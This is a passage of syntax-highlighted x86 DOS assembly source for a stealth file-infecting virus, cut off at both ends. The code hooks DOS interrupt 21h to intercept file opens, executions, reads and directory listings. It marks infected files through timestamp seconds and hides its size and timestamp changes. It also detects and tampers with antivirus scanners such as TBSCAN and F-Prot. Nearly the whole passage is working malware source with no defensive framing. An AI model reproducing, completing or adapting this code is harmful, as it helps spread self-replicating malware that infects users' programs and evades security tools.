        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">           </span><span class="sc1">; Mask seconds.</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011110b</span><span class="sc0">           </span><span class="sc1">; 60 seconds ?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">No_Del</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Save_File_Pos</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">               </span><span class="sc1">; Pos. old header.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read old header.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_End_File</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write &lt;EOF&gt; marker.</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_Begin_File</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write old header.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">               </span><span class="sc1">; Set clean filedate.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileTime</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileDate</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">           </span><span class="sc1">; Clear seconds.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

</span><span class="sc5">No_Del</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Unhook_i24h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">; Check if timestamp is marked as 'infected'.</span><span class="sc0">
</span><span class="sc1">; BX = Filehandle.</span><span class="sc0">
</span><span class="sc1">; ZF set when infected.</span><span class="sc0">
</span><span class="sc5">Check_Stamp</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get time &amp; datestamp.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">           </span><span class="sc1">; Infected?</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011110b</span><span class="sc0">           </span><span class="sc1">; (Set's flags).</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">



</span><span class="sc1">; Hides infected timestamp.</span><span class="sc0">
</span><span class="sc5">Stealth_Time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">No_Stealth_Time</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">No_Stealth_Time</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Stamp</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">No_Stealth_Time</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">      </span><span class="sc1">; Zero seconds.</span><span class="sc0">

</span><span class="sc5">No_Stealth_Time</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Temp</span><span class="sc0">

        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Save_File_Pos</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">               </span><span class="sc1">; Get file-position.</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CWD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Pos</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Restore_File_Pos</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Pos</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Pos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">Go_Begin_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CWD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc1">;-------------------------</span><span class="sc0">
</span><span class="sc1">; Goes to end of file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  In:    BX = filehandle</span><span class="sc0">
</span><span class="sc1">; Out: DX:AX = filesize</span><span class="sc0">
</span><span class="sc1">;-------------------------</span><span class="sc0">
</span><span class="sc5">Go_End_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CWD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">; These INT 21h functions will be trapped by our virus. If the subfunction</span><span class="sc0">
</span><span class="sc1">; is 0FFh, it will be treaded like a wildcard.</span><span class="sc0">
</span><span class="sc5">Functions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">11FFh</span><span class="sc0">                   </span><span class="sc1">; Findfirst (FCB).</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Stealth_Filesize_FCB</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">12FFh</span><span class="sc0">                   </span><span class="sc1">; Findnext (FCB).</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Stealth_Filesize_FCB</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4EFFh</span><span class="sc0">                   </span><span class="sc1">; Findfirst (handle).</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Stealth_Filesize</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4FFFh</span><span class="sc0">                   </span><span class="sc1">; Findnext (handle).</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Stealth_Filesize</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4B00h</span><span class="sc0">                   </span><span class="sc1">; Execute file.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Init_Exec</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4B01h</span><span class="sc0">                   </span><span class="sc1">; Load but not execute.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Clean_By_File</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">5700h</span><span class="sc0">                   </span><span class="sc1">; Get filetime.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Stealth_Time</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">3CFFh</span><span class="sc0">                   </span><span class="sc1">; Create/truncate file.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">3DFFh</span><span class="sc0">                   </span><span class="sc1">; Open file.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">3FFFh</span><span class="sc0">                   </span><span class="sc1">; Read file (handle).</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Stealth_File_Read</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">40FFh</span><span class="sc0">                   </span><span class="sc1">; Write to file (handle).</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Clean_By_Handle</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">42FFh</span><span class="sc0">                   </span><span class="sc1">; lseek file.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Stealth_Fileseek</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">41FFh</span><span class="sc0">                   </span><span class="sc1">; Delete file.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4CFFh</span><span class="sc0">                   </span><span class="sc1">; Program terminate.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Switch_Stealth_On</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">6CFFh</span><span class="sc0">                   </span><span class="sc1">; Extended open/create.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">43FFh</span><span class="sc0">                   </span><span class="sc1">; Get file-attributes.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Check_Infect</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Residency_Check</span><span class="sc0">         </span><span class="sc1">; Are-You-There call.</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">Return_Call</span><span class="sc0">

        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; End table.</span><span class="sc0">
</span><span class="sc5">NewInt21h</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Functions</span><span class="sc0">

</span><span class="sc5">Next_Function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc0">                  </span><span class="sc1">; End of table reached?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">End_Table_Reached</span><span class="sc0">       </span><span class="sc1">; Then abort.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Function match?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Another</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                </span><span class="sc1">; Don't compare subfunction?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exec_Function</span><span class="sc0">           </span><span class="sc1">; Then JMP to routine.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Subfunction right?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exec_Function</span><span class="sc0">           </span><span class="sc1">; Then JMP to routine.</span><span class="sc0">

</span><span class="sc5">Another</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Next entry.</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Next_Function</span><span class="sc0">           </span><span class="sc1">; Repeat loop.</span><span class="sc0">

</span><span class="sc5">End_Table_Reached</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

</span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int21h</span><span class="sc0">

</span><span class="sc5">Exec_Function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Ret_Add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Ret_Add</span><span class="sc0">              </span><span class="sc1">; JMP to routine.</span><span class="sc0">


</span><span class="sc1">; === Let the virus know that we are already installed in memory. ===</span><span class="sc0">
</span><span class="sc5">Return_Call</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem</span><span class="sc0">

        </span><span class="sc6">IRET</span><span class="sc0">


</span><span class="sc5">Switch_Stealth_On</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Init_Status</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Continue</span><span class="sc0">


</span><span class="sc5">Init_Exec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">

        </span><span class="sc1">; Should we be inactive during run of program?</span><span class="sc0">
        </span><span class="sc1">; Else causes problems.</span><span class="sc0">
        </span><span class="sc1">; ARJ.EXE Timestamp incorrect.</span><span class="sc0">
        </span><span class="sc1">; PKZIP.EXE Wrong filesizes, etc.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">No_Active</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">End_No_Active</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">No_Active</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Search_Table</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">No_Disable</span><span class="sc0">

        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000b</span><span class="sc0">

</span><span class="sc5">No_Disable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TBSCAN</span><span class="sc0">       </span><span class="sc1">; Add parameters to TBSCAN?</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Search_Table</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Not_TbScan</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">     </span><span class="sc1">; Length parameters.</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Parameters</span><span class="sc0">

        </span><span class="sc6">MOVSW</span><span class="sc0">
        </span><span class="sc6">MOVSW</span><span class="sc0">
        </span><span class="sc6">MOVSW</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">

</span><span class="sc5">Not_TbScan</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">


            </span><span class="sc1">; === INFECTION ROUTINE ===</span><span class="sc0">
</span><span class="sc5">Check_Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Push_All</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Hook_i24h</span><span class="sc0">               </span><span class="sc1">; Dummy error-handler.</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc0">                 </span><span class="sc1">; Extended open/create?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">No_Ext_Open</span><span class="sc0">             </span><span class="sc1">; (used by F-Prot).</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; DX = SI.</span><span class="sc0">
